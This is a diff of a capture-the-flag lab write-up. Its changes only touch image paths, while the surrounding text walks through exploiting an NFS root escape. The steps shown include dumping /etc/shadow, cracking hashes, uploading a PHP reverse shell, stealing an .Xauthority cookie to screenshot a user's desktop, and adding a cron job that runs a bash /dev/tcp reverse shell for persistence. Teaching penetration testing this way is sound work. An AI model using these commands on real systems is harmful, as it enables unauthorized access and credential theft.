@@ -179,7 +179,7 @@ The [pentest profile](<https://github.com/projectdiscovery/nuclei-templates/blob
 ```bash
 nuclei -target $box -profile pentest -rl 150 -retries 2 -timeout 7 -stats -me nucleiPentest
 ```
-![](<./attachments/Pasted image 20260412074110.png>)
+![](</attachments/Pasted image 20260412074110.png>)
 Again we can see that NFS is there as well as some interesting security headers are missing. Let's examine nfs further.
 ~~Note~~:
 >In a real engagement the missing security headers would be a legitimate issue that would be raised but on this box, I don't think we need to pay attention to them.
@@ -188,7 +188,7 @@ Again we can see that NFS is there as well as some interesting security headers 
 netexec nfs $box --shares
 ```
 As we can see there are 2 shares available, a home folder and the web folder so let's look at both and `root escape:True` is set.
-![](<./attachments/Pasted image 20260409202017.png>)
+![](</attachments/Pasted image 20260409202017.png>)
 ### What Is Root Escape?
 By default, NFS exports do not strictly limit access to only the exported directory. Access to files is controlled through **file handles**, which clients use to reference objects on the server.
 
@@ -198,7 +198,7 @@ This is commonly referred to as a **“root escape”**.
 
 Tools like netexec automatically check for this condition during enumeration. For example:
 
->![](<./attachments/Pasted image 20260410064944.png>)
+>![](</attachments/Pasted image 20260410064944.png>)
 ```
 NFS  <ip>  <port>  <ip>  [*] Supported NFS versions: (3, 4) (root escape: False)
 ```
@@ -233,25 +233,25 @@ The great thing about this tool is that it will just try and dump hashes by defa
 nfs_analyze $box --findings-file scans/nfs/nfs_analyze.md
 ```
 As we can see it dumps `/etc/shadow` automatically as part of it's root escape checks. We can see the root password hash here.
-![](<./attachments/Pasted image 20260410071826.png>)
+![](</attachments/Pasted image 20260410071826.png>)
 We can also see hashes for two other users "alex" & "ross"
-![](<./attachments/Pasted image 20260410071917.png>)
+![](</attachments/Pasted image 20260410071917.png>)
 >[!note]
 >The findings file does not contain `/etc/shadow` creds just the escapable exports and attempts at discovering "no_root_squash" exports/vulnerability.
->![](<./attachments/Pasted image 20260410071716.png>)
+>![](</attachments/Pasted image 20260410071716.png>)
 
 ## Dumping `/etc/shadow` & `/etc/passwd` Using netexec:
 Here is how you do it in netexec.
 ```bash
 netexec nfs $box --get-file '/etc/shadow' loot/shadow.md
 ```
-![](<./attachments/Pasted image 20260410071136.png>)
+![](</attachments/Pasted image 20260410071136.png>)
 
 Now we dump `/etc/passwd` too.
 ```bash
 netexec nfs $box --get-file '/etc/passwd' loot/passwd.md
 ```
-![](<./attachments/Pasted image 20260410073430.png>)
+![](</attachments/Pasted image 20260410073430.png>)
 
 
 ## Path Forward
@@ -272,20 +272,20 @@ openssl passwd -6 -salt [salt] [password]
 #Example
 openssl passwd -6 -salt thisIsTheSalt bloodstiller
 ```
-![](<./attachments/Pasted image 20260412063117.png>)
+![](</attachments/Pasted image 20260412063117.png>)
 ```bash
 $6$thisIsTheSalt$K2mySfsnpivoofZB4s7ZOtpv2lqJ2VLQUkk8tOMF3LlbPM1D.YxNJSQR42RoxCwa.8Oz5YJdHH/hhAuYLpeGI/
 ```
 
 Now we open the `/etc/shadow` file we opened earlier and replace the root users password hash with our own.
-![](<./attachments/Pasted image 20260412063203.png>)
+![](</attachments/Pasted image 20260412063203.png>)
 
 We can then use netexec to try and put the modified filed back on the host.
 ```bash
 netexec nfs $box --put-file shadow.md '/etc/shadow'
 ```
 Unfortunately it looks like we can read the shadow file but not write to it. This also means we cannot add our own user to `/etc/shadow` files either.
-![](<./attachments/Pasted image 20260412065152.png>)
+![](</attachments/Pasted image 20260412065152.png>)
 This means options 1 & 2 are out of the question.
 
 ## Attempting To Crack The Hashes:
@@ -296,7 +296,7 @@ First we will use unshadow to prepare the file for cracking.
 unshadow passwd.md shadow.md >> recoveredHashes.md
 ```
 >[!note] We will also remove all other hashes in the file apart from alex, ross & root so it looks like the below
-![](<./attachments/Pasted image 20260410074006.png>)
+![](</attachments/Pasted image 20260410074006.png>)
 
 Then we can point john at the hashes & whilst this runs we can  enumerate further.
 ```bash
@@ -313,24 +313,24 @@ With netexec we can easily enumerate existing shares so let's do that.
 netexec nfs $box --ls '/home/ross'
 ```
 As we can see there is no `.ssh` folder here however we may be able to add one, I doubt it though as the permissions look solid, however stranger things have happened so we can try that later as a hail mary.
-![](<./attachments/Pasted image 20260412091848.png>)
+![](</attachments/Pasted image 20260412091848.png>)
 ~~Note~~:
 > There is also something else here I didn't notice first time around. I will get to it further down but it completely slipped by me.
 
 
 Let's keep digging & we can see there is keepass `.kdbx` file in `Documents`
-![](<./attachments/Pasted image 20260412091917.png>)
+![](</attachments/Pasted image 20260412091917.png>)
 
 Let's grab that.
 ```bash
 netexec nfs $box --get-file '/home/ross/Documents/Passwords.kdbx' loot/Passwords.kdbx
 ```
-![](<./attachments/Pasted image 20260412092100.png>)
+![](</attachments/Pasted image 20260412092100.png>)
 
 ### Attempting To Crack The KDBX File:
 Usually with `kdbx` files we can use `keepass2john` however if we run it on this one we get the following:
 
-![](<./attachments/Pasted image 20260412094910.png>)
+![](</attachments/Pasted image 20260412094910.png>)
 
 Now I did some digging that says use the latest version of john, however I am using the latest version so let's look at other options.
 
@@ -349,10 +349,10 @@ python bfkeepass.py -d Passwords.kdbx -w /usr/share/wordlists/rockyou.txt
 netexec nfs $box --enum-shares
 ```
 If we look at the output of the above command we can see that the UID of the folders/files is different for the `/var/www/html` share and that in fact the user has `rwx` permissions.
-![](<./attachments/Pasted image 20260505130124.png>)
+![](</attachments/Pasted image 20260505130124.png>)
 
 If we then cross reference these UID's with the `/etc/passwd` file we recovered earlier we can see that `1001` is ross & `2017` is alex.
-![](<./attachments/Pasted image 20260413140952.png>)
+![](</attachments/Pasted image 20260413140952.png>)
 This means if we can access the share in the context of alex then we can then `rwx` in that share.
 
 
@@ -373,51 +373,51 @@ sudo mkdir /mnt/target-NFS
 # Mount
 sudo mount -t nfs $box:/var /mnt/target-NFS -o nolock,nfsvers=4 -v
 ```
-![](<./attachments/Pasted image 20260505141251.png>)
+![](</attachments/Pasted image 20260505141251.png>)
 It has mounted.
 
 # 2. Foothold
 ## Writing to the share as alex
 Let's check if we can access the share as our standard user.
 As we can see no dice.
-![](<./attachments/Pasted image 20260505141417.png>)
+![](</attachments/Pasted image 20260505141417.png>)
 Now lets try as alex.
 ```bash
 #Switch to alex
 sudo su alex
 ```
-![](<./attachments/Pasted image 20260505142532.png>)
+![](</attachments/Pasted image 20260505142532.png>)
 As we can see we can access the share as e
 Let's see if we can create a file as alex.
 ```bash
 touch test.txt
 ```
 As we see we can! So we can write as alex.
-![](<./attachments/Pasted image 20260505143925.png>)
+![](</attachments/Pasted image 20260505143925.png>)
 
 Now that we can write to the share let's try and upload a reverse shell.
 
 As this is running Apache it's a safe bet to assume that php is enabled and running. So let's try ol' faithful [pentest monkey php shell](https://github.com/pentestmonkey/php-reverse-shell)
 
 We modify the ip & port then save in the root web directory.
-![](<./attachments/Pasted image 20260505161727.png>)
-![](<./attachments/Pasted image 20260505161845.png>)
+![](</attachments/Pasted image 20260505161727.png>)
+![](</attachments/Pasted image 20260505161845.png>)
 
 Then if we setup a nc listener & visit http://[ip]:shell.php we will get our reverse shell.
 
 So we have our foothold.
 
-![](<./attachments/Pasted image 20260505162625.png>)
+![](</attachments/Pasted image 20260505162625.png>)
 
 # 3. Privilege Escalation:
 When we first get our reverse shell we can see that the user ross is currently logged in and has a gnome session (if you're unfamiliar with linux gnome is a very popular desktop environment and the default one that ships with ubuntu)
-![](<./attachments/Pasted image 20260505162830.png>)
+![](</attachments/Pasted image 20260505162830.png>)
 
 This output is the default for the `w`ho command which displays information about who is logged in.
 
 So what can we do with this information? Well remember earlier when I said there was something that slipped passed me initially when I was enumerating the nfs shares, well it has to do with this.
 
-![](<./attachments/Pasted image 20260505164146.png>)
+![](</attachments/Pasted image 20260505164146.png>)
 
 ## Side Quest: What's `.Xauthority`?
 The `.Xauthority` file is found is found in the user's home directory by default where it's used to store credentials, cookies that are then used by `xauth` for authentication of X sessions. Once an X session begins the cookies is used to authenticate connections to the display.
@@ -431,25 +431,25 @@ So how does this help us? If we can steal the `.Xauthority` file we can view the
 ```bash
 netexec nfs $box --get-file "/home/ross/.Xauthority" .Xauthority
 ```
-![](<./attachments/Pasted image 20260506080552.png>)
+![](</attachments/Pasted image 20260506080552.png>)
 
 We copy this to the host using our existing nfs session as alex
 ```bash
 cp .Xauthority /mnt/target-NFS/www/html/
 ```
-![](<./attachments/Pasted image 20260508143758.png>)
+![](</attachments/Pasted image 20260508143758.png>)
 
 
 We can now load this into the XAUTHORITY env as per the xauth man pages.
 ```bash
 export XAUTHORITY=.Xauthority
 ```
-![](<./attachments/Pasted image 20260506080736.png>)
+![](</attachments/Pasted image 20260506080736.png>)
 
 This will allow us to interact with Ross's X session. However we need a way to do that. Luckily we can do it with `xwd` let's check if it's installed.
 
 It is.
-![](<./attachments/Pasted image 20260508151231.png>)
+![](</attachments/Pasted image 20260508151231.png>)
 ### Side Quest: What is `xwd`?
 
 `xwd` [X Window Dump](https://linux.die.net/man/1/xwd) is a utility that captures screenshots of X11 displays, and dumps the raw window data into the XWD file format. By loading another user's `.Xauthority` cookie beforehand, we present a valid authentication token to the X server,  which happily accepts our connection and lets us dump their entire desktop session to disk, silent and unsuspecting.
@@ -480,7 +480,7 @@ Retrieve with netexec like we have done with other files.
 ```bash
 netexec nfs $box --get-file "/var/www/html/screen.xwd" screen.xwd
 ```
-![](<./attachments/Pasted image 20260508144832.png>)
+![](</attachments/Pasted image 20260508144832.png>)
 
 We can use `convert` to convert the dump into a jpg to easily view.
 ```bash
@@ -488,12 +488,12 @@ convert screen.xwd screen.jpg
 ```
 
 When we open it we can see that KeePassXC is currently open on the desktop with the root users password displayed in clear text.
-![](<./attachments/Pasted image 20260508145114.png>)
+![](</attachments/Pasted image 20260508145114.png>)
 
 We can now easily su to the root user and then access the flag.
-![](<./attachments/Pasted image 20260508145822.png>)
+![](</attachments/Pasted image 20260508145822.png>)
 
-![](<./attachments/Pasted image 20260508145842.png>)
+![](</attachments/Pasted image 20260508145842.png>)
 # 4. Persistence:
 This is a method to get back in sucks though, so lets setup some persistence with a simple cron job reverse shell.
 ## Creating a cron job reverse shell:
@@ -501,14 +501,14 @@ This is a method to get back in sucks though, so lets setup some persistence wit
 (crontab -l > .tab ; echo "* * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.72/80 0>&1'" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1
 ```
 
-![img](<./attachments/2024-12-21-075648_.png>)
+![img](</attachments/2024-12-21-075648_.png>)
 
 Let's verify it's in the crontab by running `crontab -l`
-![](<./attachments/Pasted image 20260508150119.png>)
+![](</attachments/Pasted image 20260508150119.png>)
 As we can see it's running.
 
 I start my listener and get a connection back after 1 minute.
-![](<./attachments/Pasted image 20260508150221.png>)
+![](</attachments/Pasted image 20260508150221.png>)
 ~~Note~~
 >This is great as a means to call back out to our attack machine, however an interval of every 1 minute is excessive, it would typically be better to set it at longer intervals to re-connect, also this would be flagged in a second in a actual environment.
 
